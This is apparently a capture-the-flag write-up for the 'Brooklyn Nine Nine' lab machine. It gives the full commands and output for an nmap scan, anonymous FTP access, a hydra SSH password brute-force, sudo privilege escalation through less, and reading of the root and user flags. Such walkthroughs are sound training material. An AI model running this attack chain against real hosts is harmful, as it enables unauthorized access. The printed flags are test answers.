#### 1. Scanning

```
nmap -Pn -A 10.10.59.87  
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-23 04:20 EST
Nmap scan report for 10.10.59.87
Host is up (0.076s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.170.47
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.04 seconds
```

Open ports are 21 (with a readable and writable file), 22 and 80                                                                           

<br />

#### 2. FTP

I access ftp as `ftp` and without password and download a file

```
ftp 10.10.59.87  
Connected to 10.10.59.87.
220 (vsFTPd 3.0.3)
Name (10.10.59.87:kali): ftp
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.00 secs (28.7509 kB/s)
ftp> 
```

which says

```
cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

In this case, I will try to bruteforce password for `jake` using hydra

<br />

#### 3. Hydra

I type

`hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.59.87 ssh`

and quickly find a password

`[22][ssh] host: 10.10.59.87   login: jake   password: 987654321`

<br />

#### 4. SSH to machine

I ssh to machine, login and check permissions:

```
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

User can execute `less` as root, so I check how to escalate at GTFO bins, become root and read a flag:

```
jake@brookly_nine_nine:~$ sudo -u root /usr/bin/less /etc/profile
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
```

`user.txt` flag is not in `jake`s home folder but turns out to be in another, `holt`

As I am already root, I ca nread it easily:

```
# ls /home
amy  holt  jake
# cd /home/jake	
# ls
# ls
# cd ..
# cd holt
# ls
nano.save  user.txt
# cat user.txt	
ee11cbb19052e40b07aac0ca060c23ee
# 
```

That was a very easy one.